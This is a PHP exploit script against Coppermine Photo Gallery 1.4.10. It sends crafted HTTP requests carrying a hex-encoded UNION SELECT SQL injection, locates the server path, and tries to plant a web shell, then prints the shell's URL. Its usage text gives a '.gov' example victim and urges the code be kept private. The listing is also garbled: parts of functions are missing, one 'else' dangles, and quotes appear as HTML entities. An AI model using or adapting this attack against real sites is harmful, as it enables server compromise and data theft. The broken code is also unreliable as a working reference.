Coppermine Photo Gallery 1.4.10 Remote SQL Injection Exploit
============================================================




<?php
#####################################
# Coppermine gallery SQL injection exploit
# based on RST/GHC bugs
# Author: bazik, icq 178377
#####################################
error_reporting(0);
class cpg1410_xek {
   public $GLOBALS = array();
 
      $a1 = &#039;1) UNION SELECT &#039; . $this->toHex($sql) . &#039;, &#039; . $this->toHex(&#039;bazik&#039;) . &#039; LIMIT 1,1/*&#039;;
      $b1 = &#039;bazik&#039;;
      $a2 = $sql;
      $b2 = &#039;bazik&#039;;
      $arr = array($a1 => $b1, $a2 => $b2);
   }
 
   function toHex($str) {
      for ($i=0; $i < strlen($str); $i++)
         $result .= sprintf("%X", ord($str[$i]));
      return "0x" . $result;
   }
 
   function sendQuery($out) {
      $fp = fsockopen($this->GLOBALS[&#039;host&#039;], 80, $errno, $errstr, 30);
      if(!$fp)
         die("[-] Can&#039;t connect to " . $this->GLOBALS[&#039;host&#039;] . " ...\n\n");
      else {
         fwrite($fp, $out);
         while(!feof($fp))
            $str .= fgets($fp, 128);
         fclose($fp);
         return $str;
      }
   }
 
   function getCookiePrefix() {
      $out  = "HEAD " . $this->GLOBALS[&#039;path&#039;] . "thumbnails.php?album=" . $this->GLOBALS[&#039;albumId&#039;] . " HTTP/1.1\r\n";
      $out .= "Host: " . $this->GLOBALS[&#039;host&#039;] . "\r\n";
      $out .= "Connection: Close\r\n\r\n";
      return $result[1][0];
   }
 
   function getPathToShell() {
      $out  = "GET " . $this->GLOBALS[&#039;path&#039;] . "/themes/sample/theme.php HTTP/1.1\r\n";
      $out .= "Host: " . $this->GLOBALS[&#039;host&#039;] . "\r\n";
      $out .= "Connection: Close\r\n\r\n";
      $str = strip_tags($result[1][0]);
      return str_replace("\\", "/", $str);
   }
 
   function getShell() {
      $out  = "GET " . $this->GLOBALS[&#039;path&#039;] . "thumbnails.php?album=" . $this->GLOBALS[&#039;albumID&#039;] . " HTTP/1.1\r\n";
      $out .= "Host: " . $this->GLOBALS[&#039;host&#039;] . "\r\n";
      $out .= "Accept-Language: ru\r\n";
      $out .= "Connection: Close\r\n\r\n";
      $this->sendQuery($out);
   }
 
   function hat() {
      echo "\n## Coppermine SQL injection exploit\n";
      echo "## Vulnerable: CPG 1.4.10 stable\n\n";
      echo "## THIS IS UNPUBLISHED EXPLOIT CODE\n";
      echo "## KEEP IT PRIVATE\n\n";
   }
 
   function foot() {
      echo "## (c)oded by bazik\n";
      echo "## 20/01/2008\n";
   }
}
 
$exp = new cpg1410_xek();
 
if ($argc != 4) {
   $exp->hat();
   echo "For example:\n\n";
   echo "   php cpg1410_xek.php [url] [path] [albumID]\n\n";
   echo "      [url]     = http://www.victim.gov\n";
   echo "      [path]    = \cpg1410\\\n";
   echo "      [albumID] = 1\n\n\n";
   $exp->foot();
} else {
   $exp->hat();
 
   $exp->GLOBALS[&#039;host&#039;]    = $matches[2];
   $exp->GLOBALS[&#039;path&#039;]    = $argv[2];
   $exp->GLOBALS[&#039;albumID&#039;] = intval($argv[3]);
   $exp->GLOBALS[&#039;pathToShell&#039;]  = $exp->getPathToShell();
 
   else
 
   if(empty($exp->GLOBALS[&#039;pathToShell&#039;]))
      echo "[-] Can&#039;t recognize full path ...\n\n";
   else {
      echo "[+] Full path: " . $exp->GLOBALS[&#039;pathToShell&#039;] . "\n\n";
      $exp->getShell();
      $url = &#039;http://&#039; . $exp->GLOBALS[&#039;host&#039;] . $exp->GLOBALS[&#039;path&#039;] . &#039;albums/userpics/shell.php&#039;;
      if (file_get_contents($url))
         echo "   Web-shell: " . $url . "\n\n";
      else
         echo "[-] Can&#039;t create web-shell ...\n\n";
   }
 
   $exp->foot();
}
?>



